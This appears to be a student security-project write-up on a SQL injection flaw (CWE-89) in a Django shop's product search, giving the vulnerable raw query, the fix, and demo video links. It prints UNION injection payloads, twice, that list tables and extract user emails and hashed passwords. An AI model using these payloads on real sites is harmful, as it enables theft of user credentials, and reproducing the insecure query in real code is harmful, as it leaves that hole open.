# CWE-89: SQL Injection

**Severity**: 6.1

**CVSS Vector String**: AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H

### Description

The online shop's search functionality is susceptible to SQL injection attacks, as indicated by CWE-89. SQL injection occurs when untrusted input is directly incorporated into SQL queries without proper validation.

By using the raw method to perform SQL queries and using the % operator to perform string formatting directly into the query code without input sanitization we are exposing the websites to SQL Injection attacks.

```python
# Insecure sql query:
products = Product.objects.raw("SELECT * FROM shop_product WHERE shop_product.title LIKE '%%%s%%'" % query)
```

### Exploitation

To exploit this vulnerability, an attacker can manipulate the search input to include SQL code that alters the behavior of the query.

By just inserting the character **'** in the search input box an attacker can confirm the existence of SQL Injection in the form. 

Then, the attacker might manipulate the search query to display sensitive data, such as database table names or even private login information, such as e-mail and an hashed password.

```
// Get table names
' UNION  SELECT null, 1, null, null, name, null, null, null, null FROM sqlite_master WHERE type='table' -- //

// Get column names for table 'accounts_user'
' UNION  SELECT cid, 'something', name, null, type, pk , dflt_value, null, null FROM pragma_table_info('accounts_user') -- //

// Get hashed passwords from users
' UNION  SELECT null, 'something', password , full_name, email, null, null, null, null FROM accounts_user -- //
```

### Mitigations

We can use the raw method and still prevent SQL Injection attacks by passing the parameters to the method using the params argument instead of manually performing a string format. 

```python
products = Product.objects.raw('SELECT * FROM shop_product WHERE shop_product.title LIKE %s', ['%' + query + '%'])
```

As previously mentioned Django has its own Object Relational Mapper which allows the programmer to interact with the SQL database using classes and object oriented programming. If the queries we need to formulate aren't too complex we should prioritize **Django ORM** queries. We should always use that instead of raw SQL queries, since frameworks often work as safeguards for devs, who can easily make security mistakes.

```python
# Secure Django ORM sql query:
products = Product.objects.filter(title__icontains=query)
```

If we use raw SQL queries and don't use the params argument we have to manually sanitize the user input properly to prevent those attacks.

### Demonstration

This section will have video footage of *exploiting the vulnerabilities* and *trying to exploit them after they've been fixed*:

#### Exploiting Vulnerability

- An attacker inputs the following strings into the *Search* box for products:
```
// Get table names
' UNION  SELECT null, 1, null, null, name, null, null, null, null FROM sqlite_master WHERE type='table' -- //

// Get column names for table 'accounts_user'
' UNION  SELECT cid, 'something', name, null, type, pk , dflt_value, null, null FROM pragma_table_info('accounts_user') -- //

// Get hashed passwords from users
' UNION  SELECT null, 'something', password , full_name, email, null, null, null, null FROM accounts_user -- //
```

The cards destined for products will now show previleged information the attacker should not have access to, such as hashed passwords and table names.

https://github.com/detiuaveiro/1st-project-group_04/assets/97046574/3501f016-0f8b-4e79-b971-b3042ad3ec37

#### Trying to exploit after fix is implemented

- An attacker tries to use a malicious string to get table names but fails.

https://github.com/detiuaveiro/1st-project-group_04/assets/97046574/03662e17-787b-48cb-9684-3f56e509f636

